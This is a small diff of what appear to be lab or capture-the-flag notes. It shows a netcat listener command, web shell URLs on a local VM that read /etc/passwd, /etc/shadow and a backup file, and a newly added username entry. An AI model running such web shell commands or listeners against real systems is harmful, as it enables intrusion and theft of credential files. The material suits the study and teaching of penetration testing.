@@ -61,3 +61,6 @@ nc -lvnp 4444
 - http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
 - http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
 - http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz
+
+# username
+shrek
